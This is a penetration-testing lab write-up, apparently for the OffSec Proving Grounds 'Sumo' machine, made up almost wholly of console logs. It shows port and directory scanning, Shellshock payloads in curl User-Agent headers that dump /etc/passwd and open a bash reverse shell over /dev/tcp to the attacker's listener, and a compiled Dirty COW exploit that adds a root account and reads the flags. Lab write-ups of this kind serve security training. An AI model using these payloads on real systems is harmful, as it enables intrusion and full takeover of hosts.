# Recon

```console
oot@kali:/OSCPv3/offsec_pg/Sumo# nmap -Pn -sT -sV -n 192.168.80.87  -p- --min-rate 1000 --max-retries 2
Starting Nmap 7.70 ( https://nmap.org ) at 2021-11-03 15:34 CST
Warning: 192.168.80.87 giving up on port because retransmission cap hit (2).
Nmap scan report for 192.168.80.87
Host is up (0.075s latency).
Not shown: 60037 closed ports, 5496 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.64 seconds
```

```console
root@kali:/OSCPv3/offsec_pg/Sumo# nmap -Pn -sT -sV --script http-enum -n 192.168.80.87 -p 80 --min-rate 1000 --max-retries 2
Starting Nmap 7.70 ( https://nmap.org ) at 2021-11-03 15:36 CST
Nmap scan report for 192.168.80.87
Host is up (0.096s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.93 seconds
```

```console
root@kali:/OSCPv3/offsec_pg/Sumo# nmap -Pn -sT -sV -sC -n 192.168.80.87 -p 80 
Starting Nmap 7.70 ( https://nmap.org ) at 2021-11-03 15:38 CST
Nmap scan report for 192.168.80.87
Host is up (0.072s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.49 seconds
```

```console
root@kali:/OSCPv3/offsec_pg/Sumo# dirb http://192.168.80.87

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Nov  3 15:39:01 2021
URL_BASE: http://192.168.80.87/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.80.87/ ----
+ http://192.168.80.87/cgi-bin/ (CODE:403|SIZE:289)                                                                                            
+ http://192.168.80.87/index (CODE:200|SIZE:177)                                                                                               
+ http://192.168.80.87/index.html (CODE:200|SIZE:177)                                                                                          
+ http://192.168.80.87/server-status (CODE:403|SIZE:294)                                                                                                                                                                                        

-----------------
END_TIME: Wed Nov  3 15:49:36 2021
DOWNLOADED: 4612 - FOUND: 4
```

```console
root@kali:/OSCPv3/offsec_pg/Sumo# python3 /opt/dirsearch/dirsearch.py -u http://192.168.80.87/cgi-bin/ -e php,txt,sh,pl

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: php, txt, sh, pl | HTTP method: get | Threads: 10 | Wordlist size: 7208

Error Log: /opt/dirsearch/logs/errors-21-11-03_15-50-42.log

Target: http://192.168.80.87/cgi-bin/

[15:50:44] Starting: 
[15:50:47] 403 -  300B  - /cgi-bin/.ht_wsr.txt
[15:50:47] 403 -  293B  - /cgi-bin/.hta
[15:50:47] 403 -  302B  - /cgi-bin/.htaccess-dev
[15:50:47] 403 -  304B  - /cgi-bin/.htaccess-local
[15:50:47] 403 -  304B  - /cgi-bin/.htaccess-marco
[15:50:47] 403 -  303B  - /cgi-bin/.htaccess.bak1
[15:50:47] 403 -  302B  - /cgi-bin/.htaccess.BAK
[15:50:47] 403 -  302B  - /cgi-bin/.htaccess.old
[15:50:47] 403 -  303B  - /cgi-bin/.htaccess.orig
[15:50:47] 403 -  305B  - /cgi-bin/.htaccess.sample
[15:50:47] 403 -  303B  - /cgi-bin/.htaccess.save
[15:50:47] 403 -  302B  - /cgi-bin/.htaccess.txt
[15:50:47] 403 -  304B  - /cgi-bin/.htaccess_extra
[15:50:47] 403 -  303B  - /cgi-bin/.htaccess_orig
[15:50:47] 403 -  301B  - /cgi-bin/.htaccessBAK
[15:52:10] 200 -   14B  - /cgi-bin/test
[15:52:10] 200 -   14B  - /cgi-bin/test/

Task Completed
```

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Sumo/img/1.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Sumo/img/2.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Sumo/img/3.png)


```console
root@kali:/OSCPv3/offsec_pg/Sumo# curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' http://192.168.80.87/cgi-bin/test

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:104::/var/run/dbus:/bin/false
sumo:x:1000:1000:sumo,,,:/home/sumo:/bin/bash
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
```

```console
root@kali:/OSCPv3/offsec_pg/Sumo# curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/bash -l > /dev/tcp/192.168.49.80/80 0<&1 2>&1' http://192.168.80.87/cgi-bin/test
```


```console
root@kali:/OSCPv3/offsec_pg/Sumo# nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.49.80] from (UNKNOWN) [192.168.80.87] 38623
whoami
www-data
script /dev/null -c bash
www-data@ubuntu:/usr/lib/cgi-bin$ ^Z
[1]+  Detenido                nc -lvnp 80
root@kali:/OSCPv3/offsec_pg/Sumo# stty raw -echo
root@kali:/OSCPv3/offsec_pg/Sumo# nc -lvnp 80
                                             reset: unknown terminal type unknown
Terminal type? xterm

Erase set to delete.
Kill set to control-U (^U).
Interrupt set to control-C (^C).
www-data@ubuntu:/usr/lib/cgi-bin$ export TERM=xterm
www-data@ubuntu:/usr/lib/cgi-bin$ export SHELL=bash
www-data@ubuntu:/usr/lib/cgi-bin$ stty rows 36 columns 144
www-data@ubuntu:/usr/lib/cgi-bin$ 
```

```console
www-data@ubuntu:/usr/lib/cgi-bin$ ls
local.txt  test  test.sh
www-data@ubuntu:/usr/lib/cgi-bin$ cat local.txt
6686ab215bbc37c69a5aa8f86272ca69
```

```console
www-data@ubuntu:/var/www$ ls -la
total 16
drwxr-xr-x  2 root root 4096 May 11  2020 .
drwxr-xr-x 12 root root 4096 Aug 20  2020 ..
-rw-r--r--  1 root root  177 May 11  2020 index.html
-rw-r--r--  1 root root  321 May 11  2020 victim.cgi
```

```console
www-data@ubuntu:/home/sumo$ ls -la /etc/passwd
-rw-r--r-- 1 root root 946 May 11  2020 /etc/passwd
```

```console
www-data@ubuntu:/tmp$ sudo -l
[sudo] password for www-data: 
Sorry, try again.
[sudo] password for www-data: 
Sorry, try again.
[sudo] password for www-data: 
Sorry, try again.
sudo: 3 incorrect password attempts
```

```console
www-data@ubuntu:/tmp$ find / -perm -u=s -type f 2>/dev/null
/bin/su
/bin/mount
/bin/ping
/bin/ping6
/bin/umount
/bin/fusermount
/usr/bin/traceroute6.iputils
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/mtr
/usr/bin/sudoedit
/usr/bin/sudo
/usr/bin/at
/usr/bin/chsh
/usr/sbin/uuidd
/usr/sbin/pppd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
```

```console
www-data@ubuntu:/tmp$ cat /etc/issue
Ubuntu 12.04 LTS \n \l
www-data@ubuntu:/tmp$ uname -r
3.2.0-23-generic
www-data@ubuntu:/tmp$ arch 
x86_64
www-data@ubuntu:/tmp$ 
```

```console
root@kali:/OSCPv3/offsec_pg/Sumo# searchsploit dirty
-------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                |  Path
-------------------------------------------------------------------------------------------------------------- ---------------------------------
Linux Kernel - 'The Huge Dirty Cow' Overwriting The Huge Zero Page (1)                                        | linux/dos/43199.c
Linux Kernel - 'The Huge Dirty Cow' Overwriting The Huge Zero Page (2)                                        | linux/dos/44305.c
Linux Kernel 2.6.22 < 3.9 (x86/x64) - 'Dirty COW /proc/self/mem' Race Condition Privilege Escalation (SUID Me | linux/local/40616.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW /proc/self/mem' Race Condition Privilege Escalation (/etc/passwd Metho | linux/local/40847.cpp
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW PTRACE_POKEDATA' Race Condition (Write Access Method)                  | linux/local/40838.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Me | linux/local/40839.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' /proc/self/mem Race Condition (Write Access Method)                   | linux/local/40611.c
Qualcomm Android - Kernel Use-After-Free via Incorrect set_page_dirty() in KGSL                               | android/dos/46941.txt
Quick and Dirty Blog (qdblog) 0.4 - 'categories.php' Local File Inclusion                                     | php/webapps/4603.txt
Quick and Dirty Blog (qdblog) 0.4 - SQL Injection / Local File Inclusion                                      | php/webapps/3729.txt
snapd < 2.37 (Ubuntu) - 'dirty_sock' Local Privilege Escalation (1)                                           | linux/local/46361.py
snapd < 2.37 (Ubuntu) - 'dirty_sock' Local Privilege Escalation (2)                                           | linux/local/46362.py
-------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
-------------------------------------------------------------------------------------------------------------- ---------------------------------
 Paper Title                                                                                                  |  Path
-------------------------------------------------------------------------------------------------------------- ---------------------------------
DirtyTooth: Extracting VCARD data from Bluetooth iOS profiles                                                 | docs/english/42430-dirtytooth-ex
-------------------------------------------------------------------------------------------------------------- ---------------------------------
```

```console
root@kali:/OSCPv3/offsec_pg/Sumo# searchsploit -m 40839
  Exploit: Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)
      URL: https://www.exploit-db.com/exploits/40839
     Path: /usr/share/exploitdb/exploits/linux/local/40839.c
File Type: C source, ASCII text, with CRLF line terminators

Copied to: /OSCPv3/offsec_pg/Sumo/40839.c
```

```console
www-data@ubuntu:/tmp$ gcc -pthread 40839.c -o 40839 -lcrypt  2>&1 | grep cc1
gcc: error trying to exec 'cc1': execvp: No such file or directory
```

```console
www-data@ubuntu:/tmp$ locate cc1
/etc/ssl/certs/6fcc125d.0
/usr/lib/gcc/x86_64-linux-gnu/4.6/cc1
/usr/share/doc/libgcc1
/usr/share/lintian/overrides/libgcc1
....
....
```

```console
www-data@ubuntu:/tmp$ PATH=${PATH}:/usr/lib/gcc/x86_64-linux-gnu/4.6 
www-data@ubuntu:/tmp$ export PATH
www-data@ubuntu:/tmp$ gcc -pthread 40839.c -o 40839 -lcrypt
www-data@ubuntu:/tmp$ ./40839 test
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: test
Complete line:
firefart:fi6bS9A.C7BDQ:0:0:pwned:/root:/bin/bash

mmap: 7f80757b5000

id
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'test'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'test'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
www-data@ubuntu:/tmp$ 
```

```console
www-data@ubuntu:/tmp$ su firefart
Password: test
firefart@ubuntu:/tmp# whoami
firefart
firefart@ubuntu:/tmp# id
uid=0(firefart) gid=0(root) groups=0(root)
```

```console
firefart@ubuntu:~# ls
proof.txt  root.txt
firefart@ubuntu:~# cat proof.txt 
2c27ea86bf112135dec9a9b117d33db1
```

https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html#enumeration

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#perl

https://book.hacktricks.xyz/linux-unix/privilege-escalation

https://www.sevenlayers.com/index.php/125-exploiting-shellshock

https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
